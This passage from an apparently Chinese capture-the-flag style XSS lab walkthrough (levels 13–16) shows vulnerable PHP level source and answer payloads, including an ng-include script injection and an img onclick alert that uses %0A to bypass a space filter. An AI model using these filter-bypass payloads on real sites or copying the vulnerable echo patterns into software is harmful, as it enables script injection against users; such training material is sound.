type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_cook&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;variable&quot;&gt;$str33&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;center&gt;&#x27;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;center&gt;&lt;img src&#x3D;level13.png&gt;&lt;&#x2F;center&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;strlen&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;&#x2F;h3&gt;&quot;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;body&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;html&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 14&lt;&#x2F;p&gt;
&lt;p&gt;本题环境出现问题，略（Windows服务器下无法复现）&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 15&lt;&#x2F;p&gt;
&lt;p&gt;本题考查ng-include函数的使用&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204140554202.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204140554202.png&quot; alt&#x3D;&quot;image-20240204140554202&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;src&#x3D;&#39;level1.php?name&#x3D;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&#39;&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;ng-include&lt;&#x2F;code&gt;是AngularJS框架中的一个指令（directive）。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;ng-include&lt;&#x2F;code&gt;用于在AngularJS应用中包含外部的HTML文件或其他AngularJS模板。&lt;strong&gt;引入AngularJS库：&lt;&#x2F;strong&gt; 确保在你的HTML文件中引入了AngularJS库。&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;pre&gt;&lt;code class&#x3D;&quot;language-html&quot;&gt;&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;ajax.googleapis.com&#x2F;ajax&#x2F;libs&#x2F;angularjs&#x2F;1.8.0&#x2F;angular.min.js&quot;&gt;&lt;&#x2F;script&gt;
XML2. **创建AngularJS应用：** 在HTML文件中定义一个AngularJS应用。   &#96;&#96;&#96;html   &lt;div ng-app&#x3D;&quot;myApp&quot;&gt;       &lt;!-- 应用内容将在这里 --&gt;   &lt;&#x2F;div&gt;
&lt;figure class&#x3D;&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2. **使用&#96;ng-include&#96;指令：** 在需要包含外部内容的地方使用&#96;ng-include&#96;指令，并指定要包含的文件路径。&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;   &#96;&#96;&#96;html&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;   &lt;div ng-include&#x3D;&quot;&#x27;path&#x2F;to&#x2F;your&#x2F;template.html&#x27;&quot;&gt;&lt;&#x2F;div&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;

注意：单引号内的路径可以是相对路径或绝对路径。

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;定义AngularJS模块和控制器：&lt;&#x2F;strong&gt; 在JavaScript中定义AngularJS模块和控制器，并将其与应用相关联。&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;    &lt;span class&#x3D;&quot;keyword&quot;&gt;var&lt;&#x2F;span&gt; app &#x3D; angular.&lt;span class&#x3D;&quot;title function_&quot;&gt;module&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;myApp&#x27;&lt;&#x2F;span&gt;, []);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;    app.&lt;span class&#x3D;&quot;title function_&quot;&gt;controller&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;myController&#x27;&lt;&#x2F;span&gt;, &lt;span class&#x3D;&quot;keyword&quot;&gt;function&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;params&quot;&gt;$scope&lt;&#x2F;span&gt;) &#123;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;        &lt;span class&#x3D;&quot;comment&quot;&gt;&#x2F;&#x2F; 控制器逻辑&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;    &#125;);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;关联控制器和&lt;code&gt;ng-include&lt;&#x2F;code&gt;：&lt;&#x2F;strong&gt; 在包含&lt;code&gt;ng-include&lt;&#x2F;code&gt;的元素中使用&lt;code&gt;ng-controller&lt;&#x2F;code&gt;来关联控制器。&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;div&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;ng-controller&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;myController&quot;&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;    &lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;div&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;ng-include&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&#x27;path&#x2F;to&#x2F;your&#x2F;template.html&#x27;&quot;&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;div&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;div&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;这样，&lt;code&gt;ng-include&lt;&#x2F;code&gt;指令就会加载指定的HTML文件或AngularJS模板，并将其内容包含在应用中。这是一种实现模块化和代码重用的方式，特别适用于大型AngularJS应用。&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;17&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;18&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;19&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;20&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;html ng-app&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;head&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;        &lt;meta charset&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;utf-8&quot;&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;        &lt;script src&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;angular.min.js&quot;&lt;&#x2F;span&gt;&gt;&lt;&#x2F;script&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;script&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;window.alert &#x3D; &lt;span class&#x3D;&quot;function&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;function&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;params&quot;&gt;&lt;&#x2F;span&gt;)  &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;function&quot;&gt;&lt;&#x2F;span&gt;&#123;     &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;confirm&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;完成的不错！&quot;&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt; window.location.href&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;level16.php?keyword&#x3D;test&quot;&lt;&#x2F;span&gt;; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&#125;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;script&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;title&gt;欢迎来到level15&lt;&#x2F;title&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;head&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;h1 align&#x3D;center&gt;欢迎来到第&lt;span class&#x3D;&quot;number&quot;&gt;15&lt;&#x2F;span&gt;关，自己想个办法走出去吧！&lt;&#x2F;h1&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;p align&#x3D;center&gt;&lt;img src&#x3D;level15.png&gt;&lt;&#x2F;p&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;ini_set&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;display_errors&quot;&lt;&#x2F;span&gt;, &lt;span class&#x3D;&quot;number&quot;&gt;0&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;src&quot;&lt;&#x2F;span&gt;];&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&lt;body&gt;&lt;span class&#x3D;&quot;ng-include:&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;body&gt;&#x27;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 16&lt;&#x2F;p&gt;
&lt;p&gt;本题在&lt;center&gt;标签内，根据后面的&lt;img&gt;标签提示，我们可以构造一个img标签&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204141319824.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204141319824.png&quot; alt&#x3D;&quot;image-20240204141319824&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;经过尝试发现过滤了空格，我们可以用&lt;code&gt;%0A&lt;&#x2F;code&gt;换行符绕过空格&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;keyword&#x3D;&lt;img%0Asrc&#x3D;1%0Aonclick&#x3D;&quot;alert(1)&quot;&gt;&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;答案实际形式：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight txt&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;keyword&#x3D;&lt;img&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;src&#x3D;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;onclick&#x3D;&quot;alert(1)&quot;&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;17&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;18&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;19&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;20&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;21&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;22&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;23&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;24&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;25&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;26&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;27&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;28&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;29&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;!DOCTYPE &lt;span class&#x3D;&quot;keyword&quot;&gt;html&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;comment&quot;&gt;&lt;!--STATUS OK--&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;html&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;head&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;meta&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;http-equiv&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;content-type&quot;&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;content&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;span class&#x3D;&quot;variable language_&quot;&gt;window&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;property&quot;&gt;alert&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;keyword&quot;&gt;function&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;params&quot;&gt;&lt;&#x2F;span&gt;)  &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&#123;     &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;span class&#x3D;&quot;title function_&quot;&gt;confirm&lt;&#x2F;span&gt;(&lt;span 